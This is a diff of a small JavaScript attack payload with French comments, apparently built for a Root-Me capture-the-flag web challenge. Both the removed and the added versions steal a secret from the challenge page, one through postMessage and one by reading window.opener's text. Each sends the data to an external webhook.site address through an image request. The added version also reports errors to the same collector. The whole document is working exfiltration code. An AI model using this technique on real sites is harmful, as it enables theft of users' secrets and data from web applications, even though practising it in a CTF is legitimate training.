@@ -1,14 +1,21 @@
-<html>
-<body>
 <script>
-// Ouvrir la popup
-var win = window.open('http://challenge01.root-me.org:58003/profile');
-// Écouter les messages de la popup
-window.addEventListener('message', function(e) {
-    if (e.origin === 'http://challenge01.root-me.org:58003') {
-        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(e.data);
+setTimeout(function() {
+    try {
+        // Vérifier si window.opener est accessible
+        if (!window.opener) {
+            throw new Error('window.opener is null');
+        }
+        // Vérifier same-origin
+        if (window.opener.origin !== window.origin) {
+            throw new Error('Different origins: ' + window.opener.origin + ' vs ' + window.origin);
+        }
+        // Extraire le secret
+        var secret = window.opener.document.body.innerText.match(/Your secret:\s*([^\n]+)/)[1];
+        // Exfiltrer
+        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?secret=' + encodeURIComponent(secret);
+    } catch(e) {
+        // Envoyer l'erreur
+        new Image().src = 'https://webhook.site/22146e19-1f74-4218-9ba1-ba5519e2ee77?error=' + encodeURIComponent(e.message);
     }
-});
+}, 2000);
 </script>
-</body>
-</html>
